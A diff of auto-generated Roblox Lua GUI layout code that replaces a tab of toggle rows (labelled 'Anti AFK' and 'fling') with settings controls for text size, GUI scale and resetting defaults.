+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.text
+G2L["ea"] = Instance.new("UIStroke", G2L["e9"]);
+G2L["ea"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text
-G2L["eb"] = Instance.new("TextLabel", G2L["e4"]);
-G2L["eb"]["ZIndex"] = 2;
-G2L["eb"]["BorderSizePixel"] = 0;
-G2L["eb"]["TextSize"] = 14;
-G2L["eb"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["eb"]["BackgroundTransparency"] = 1;
-G2L["eb"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["eb"]["Text"] = [[X/X]];
-G2L["eb"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.UIPadding
+G2L["eb"] = Instance.new("UIPadding", G2L["e9"]);
+G2L["eb"]["PaddingLeft"] = UDim.new(0, 1);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.text.text
-G2L["ec"] = Instance.new("UIStroke", G2L["eb"]);
-G2L["ec"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.greystroke
+G2L["ec"] = Instance.new("UIStroke", G2L["e2"]);
+G2L["ec"]["ZIndex"] = 99;
+G2L["ec"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["ec"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["ec"]["Name"] = [[greystroke]];
+G2L["ec"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL
-G2L["ed"] = Instance.new("Frame", G2L["b4"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize
+G2L["ed"] = Instance.new("Frame", G2L["e2"]);
 G2L["ed"]["ZIndex"] = 99;
 G2L["ed"]["BorderSizePixel"] = 0;
 G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ed"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["ed"]["Size"] = UDim2.new(1, 0, 0, 15);
 G2L["ed"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
 G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ed"]["Name"] = [[tooltipsizeLABEL]];
-G2L["ed"]["LayoutOrder"] = 3;
+G2L["ed"]["Name"] = [[textsize]];
+G2L["ed"]["LayoutOrder"] = 11;
 G2L["ed"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text
-G2L["ee"] = Instance.new("TextLabel", G2L["ed"]);
-G2L["ee"]["TextWrapped"] = true;
-G2L["ee"]["ZIndex"] = 99;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button
+G2L["ee"] = Instance.new("TextButton", G2L["ed"]);
 G2L["ee"]["BorderSizePixel"] = 0;
+G2L["ee"]["TextTransparency"] = 1;
 G2L["ee"]["TextSize"] = 14;
-G2L["ee"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["ee"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["ee"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ee"]["ZIndex"] = 99;
 G2L["ee"]["BackgroundTransparency"] = 1;
 G2L["ee"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["ee"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ee"]["Text"] = [[Tooltip Size:]];
-G2L["ee"]["Name"] = [[text]];
+G2L["ee"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.UIPadding
 G2L["ef"] = Instance.new("UIPadding", G2L["ee"]);
-G2L["ef"]["PaddingLeft"] = UDim.new(0, 6);
+G2L["ef"]["PaddingTop"] = UDim.new(0, 2);
+G2L["ef"]["PaddingRight"] = UDim.new(0, 3);
+G2L["ef"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["ef"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsizeLABEL.text.text
-G2L["f0"] = Instance.new("UIStroke", G2L["ee"]);
-G2L["f0"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame
+G2L["f0"] = Instance.new("Frame", G2L["ee"]);
+G2L["f0"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["f0"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["f0"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["f0"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["f0"]["Name"] = [[sliderFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main
-G2L["f1"] = Instance.new("ScrollingFrame", G2L["34"]);
-G2L["f1"]["Visible"] = false;
-G2L["f1"]["Active"] = true;
-G2L["f1"]["BorderSizePixel"] = 0;
-G2L["f1"]["CanvasSize"] = UDim2.new(0, 0, 1.5, 0);
-G2L["f1"]["Name"] = [[Main]];
-G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f1"]["Size"] = UDim2.new(0, 360, 0, 255);
-G2L["f1"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f1"]["Position"] = UDim2.new(0.01351, 0, 0.01887, 0);
-G2L["f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f1"]["ScrollBarThickness"] = 0;
-G2L["f1"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.outlineStroke
+G2L["f1"] = Instance.new("UIStroke", G2L["f0"]);
+G2L["f1"]["Thickness"] = 2;
+G2L["f1"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside
-G2L["f2"] = Instance.new("Frame", G2L["f1"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade
+G2L["f2"] = Instance.new("CanvasGroup", G2L["f0"]);
 G2L["f2"]["BorderSizePixel"] = 0;
 G2L["f2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f2"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["f2"]["Position"] = UDim2.new(0.51081, 0, 0, 0);
+G2L["f2"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f2"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["f2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f2"]["Name"] = [[rightside]];
-G2L["f2"]["BackgroundTransparency"] = 1;
+G2L["f2"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.UIListLayout
-G2L["f3"] = Instance.new("UIListLayout", G2L["f2"]);
-G2L["f3"]["Padding"] = UDim.new(0, 5);
-G2L["f3"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade.UIGradient
+G2L["f3"] = Instance.new("UIGradient", G2L["f2"]);
+G2L["f3"]["Rotation"] = 90;
+G2L["f3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab
-G2L["f4"] = Instance.new("Frame", G2L["f2"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.fillbar
+G2L["f4"] = Instance.new("Frame", G2L["f0"]);
+G2L["f4"]["ZIndex"] = 5;
 G2L["f4"]["BorderSizePixel"] = 0;
-G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
-G2L["f4"]["Size"] = UDim2.new(0, 176, 0, 160);
+G2L["f4"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["f4"]["Size"] = UDim2.new(0.5, 0, 1, 0);
 G2L["f4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f4"]["Name"] = [[antiTab]];
+G2L["f4"]["Name"] = [[fillbar]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.antiScript
-G2L["f5"] = Instance.new("LocalScript", G2L["f4"]);
-G2L["f5"]["Name"] = [[antiScript]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text
+G2L["f5"] = Instance.new("TextLabel", G2L["ee"]);
+G2L["f5"]["ZIndex"] = 2;
+G2L["f5"]["BorderSizePixel"] = 0;
+G2L["f5"]["TextSize"] = 14;
+G2L["f5"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f5"]["BackgroundTransparency"] = 1;
+G2L["f5"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f5"]["Text"] = [[X/X]];
+G2L["f5"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.UIListLayout
-G2L["f6"] = Instance.new("UIListLayout", G2L["f4"]);
-G2L["f6"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
-G2L["f6"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text.text
+G2L["f6"] = Instance.new("UIStroke", G2L["f5"]);
+G2L["f6"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.greystroke
-G2L["f7"] = Instance.new("UIStroke", G2L["f4"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL
+G2L["f7"] = Instance.new("Frame", G2L["e2"]);
 G2L["f7"]["ZIndex"] = 99;
-G2L["f7"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["f7"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["f7"]["Name"] = [[greystroke]];
-G2L["f7"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+G2L["f7"]["BorderSizePixel"] = 0;
+G2L["f7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["f7"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["f7"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
+G2L["f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f7"]["Name"] = [[textsizeLABEL]];
+G2L["f7"]["LayoutOrder"] = 10;
+G2L["f7"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======
-G2L["f8"] = Instance.new("Frame", G2L["f4"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text
+G2L["f8"] = Instance.new("TextLabel", G2L["f7"]);
+G2L["f8"]["TextWrapped"] = true;
+G2L["f8"]["ZIndex"] = 99;
 G2L["f8"]["BorderSizePixel"] = 0;
+G2L["f8"]["TextSize"] = 14;
+G2L["f8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["f8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["f8"]["Size"] = UDim2.new(1, 0, 0, 4);
-G2L["f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f8"]["Name"] = [[======ACCENT======]];
+G2L["f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["f8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["f8"]["BackgroundTransparency"] = 1;
+G2L["f8"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["f8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["f8"]["Text"] = [[Text Size:]];
+G2L["f8"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor
-G2L["f9"] = Instance.new("Frame", G2L["f8"]);
-G2L["f9"]["BorderSizePixel"] = 0;
-G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["f9"]["Size"] = UDim2.new(1, -2, 0, 2);
-G2L["f9"]["Position"] = UDim2.new(0, 1, 0, 1);
-G2L["f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["f9"]["Name"] = [[GuiColor]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.UIPadding
+G2L["f9"] = Instance.new("UIPadding", G2L["f8"]);
+G2L["f9"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======ACCENT======.GuiColor.UICorner
-G2L["fa"] = Instance.new("UICorner", G2L["f9"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.text
+G2L["fa"] = Instance.new("UIStroke", G2L["f8"]);
+G2L["fa"]["Name"] = [[text]];
 
 
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk
-G2L["fb"] = Instance.new("Frame", G2L["f4"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize
+G2L["fb"] = Instance.new("Frame", G2L["e2"]);
+G2L["fb"]["ZIndex"] = 99;
 G2L["fb"]["BorderSizePixel"] = 0;
 G2L["fb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["fb"]["Size"] = UDim2.new(1, 0, 0, 20);
 G2L["fb"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["fb"]["Name"] = [[afk]];
-G2L["fb"]["LayoutOrder"] = 2;
+G2L["fb"]["Name"] = [[guisize]];
+G2L["fb"]["LayoutOrder"] = 1;
 G2L["fb"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button
-G2L["fc"] = Instance.new("TextButton", G2L["fb"]);
-G2L["fc"]["BorderSizePixel"] = 0;
-G2L["fc"]["TextTransparency"] = 1;
-G2L["fc"]["TextSize"] = 14;
-G2L["fc"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["fc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["fc"]["ZIndex"] = 50;
-G2L["fc"]["BackgroundTransparency"] = 1;
-G2L["fc"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["fc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["fc"]["Name"] = [[button]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.UIPadding
+G2L["fc"] = Instance.new("UIPadding", G2L["fb"]);
+G2L["fc"]["PaddingLeft"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.UIPadding
-G2L["fd"] = Instance.new("UIPadding", G2L["fc"]);
-G2L["fd"]["PaddingTop"] = UDim.new(0, 3);
-G2L["fd"]["PaddingRight"] = UDim.new(0, 3);
-G2L["fd"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["fd"]["PaddingBottom"] = UDim.new(0, 3);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize
+G2L["fd"] = Instance.new("Frame", G2L["fb"]);
+G2L["fd"]["ZIndex"] = 99;
+G2L["fd"]["BorderSizePixel"] = 0;
+G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["fd"]["Size"] = UDim2.new(0, 79, 0, 20);
+G2L["fd"]["Position"] = UDim2.new(0.54598, 0, 0, 0);
+G2L["fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["fd"]["Name"] = [[guisize]];
+G2L["fd"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame
-G2L["fe"] = Instance.new("Frame", G2L["fc"]);
-G2L["fe"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["fe"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["fe"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["fe"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["fe"]["Name"] = [[toggleFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.UIPadding
+G2L["fe"] = Instance.new("UIPadding", G2L["fd"]);
+G2L["fe"]["PaddingTop"] = UDim.new(0, 2);
+G2L["fe"]["PaddingRight"] = UDim.new(0, 3);
+G2L["fe"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["fe"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.outlineStroke
-G2L["ff"] = Instance.new("UIStroke", G2L["fe"]);
-G2L["ff"]["Thickness"] = 2;
-G2L["ff"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox
+G2L["ff"] = Instance.new("TextBox", G2L["fd"]);
+G2L["ff"]["Name"] = [[textbox]];
+G2L["ff"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["ff"]["TextSize"] = 14;
+G2L["ff"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ff"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["ff"]["PlaceholderText"] = [[1.00]];
+G2L["ff"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["ff"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["ff"]["Text"] = [[]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade
-G2L["100"] = Instance.new("CanvasGroup", G2L["fe"]);
-G2L["100"]["BorderSizePixel"] = 0;
-G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["100"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["100"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["100"]["Name"] = [[toggleFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.outlineStroke
+G2L["100"] = Instance.new("UIStroke", G2L["ff"]);
+G2L["100"]["Thickness"] = 2;
+G2L["100"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["100"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.button.toggleFrame.toggleFade.UIGradient
-G2L["101"] = Instance.new("UIGradient", G2L["100"]);
-G2L["101"]["Rotation"] = 90;
-G2L["101"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade
+G2L["101"] = Instance.new("CanvasGroup", G2L["ff"]);
+G2L["101"]["BorderSizePixel"] = 0;
+G2L["101"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["101"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["101"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["101"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["101"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text
-G2L["102"] = Instance.new("TextLabel", G2L["fb"]);
-G2L["102"]["TextWrapped"] = true;
-G2L["102"]["ZIndex"] = 10;
-G2L["102"]["BorderSizePixel"] = 0;
-G2L["102"]["TextSize"] = 14;
-G2L["102"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["102"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["102"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["102"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["102"]["BackgroundTransparency"] = 1;
-G2L["102"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["102"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["102"]["Text"] = [[Anti AFK]];
-G2L["102"]["Name"] = [[text]];
-G2L["102"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade.UIGradient
+G2L["102"] = Instance.new("UIGradient", G2L["101"]);
+G2L["102"]["Rotation"] = 90;
+G2L["102"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.UIPadding
-G2L["103"] = Instance.new("UIPadding", G2L["102"]);
-G2L["103"]["PaddingLeft"] = UDim.new(0, 5);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.text
+G2L["103"] = Instance.new("UIStroke", G2L["ff"]);
+G2L["103"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.text.text
-G2L["104"] = Instance.new("UIStroke", G2L["102"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text
+G2L["104"] = Instance.new("TextLabel", G2L["fb"]);
+G2L["104"]["TextWrapped"] = true;
+G2L["104"]["ZIndex"] = 99;
+G2L["104"]["BorderSizePixel"] = 0;
+G2L["104"]["TextSize"] = 14;
+G2L["104"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["104"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["104"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["104"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["104"]["BackgroundTransparency"] = 1;
+G2L["104"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["104"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["104"]["Text"] = [[GUI Scale:]];
 G2L["104"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.afk.UIPadding
-G2L["105"] = Instance.new("UIPadding", G2L["fb"]);
-G2L["105"]["PaddingLeft"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.UIPadding
+G2L["105"] = Instance.new("UIPadding", G2L["104"]);
+G2L["105"]["PaddingLeft"] = UDim.new(0, 4);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling
-G2L["106"] = Instance.new("Frame", G2L["f4"]);
-G2L["106"]["BorderSizePixel"] = 0;
-G2L["106"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["106"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["106"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["106"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["106"]["Name"] = [[fling]];
-G2L["106"]["LayoutOrder"] = 2;
-G2L["106"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.text
+G2L["106"] = Instance.new("UIStroke", G2L["104"]);
+G2L["106"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button
-G2L["107"] = Instance.new("TextButton", G2L["106"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault
+G2L["107"] = Instance.new("Frame", G2L["e2"]);
+G2L["107"]["ZIndex"] = 99;
 G2L["107"]["BorderSizePixel"] = 0;
-G2L["107"]["TextTransparency"] = 1;
-G2L["107"]["TextSize"] = 14;
-G2L["107"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["107"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["107"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["107"]["ZIndex"] = 50;
-G2L["107"]["BackgroundTransparency"] = 1;
-G2L["107"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["107"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["107"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["107"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["107"]["Name"] = [[button]];
+G2L["107"]["Name"] = [[resetdefault]];
+G2L["107"]["LayoutOrder"] = 100;
+G2L["107"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.fling.button.UIPadding
-G2L["108"] = Instance.new("UIPadding", G2L["107"]);
-G2L["108"]["PaddingTop"] = UDim.new(0, 3);
-G2L["108"]["PaddingRight"] = UDim.new(0, 3);
-G2L["108"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["108"]["PaddingBottom"] = UDim.new(0, 3);
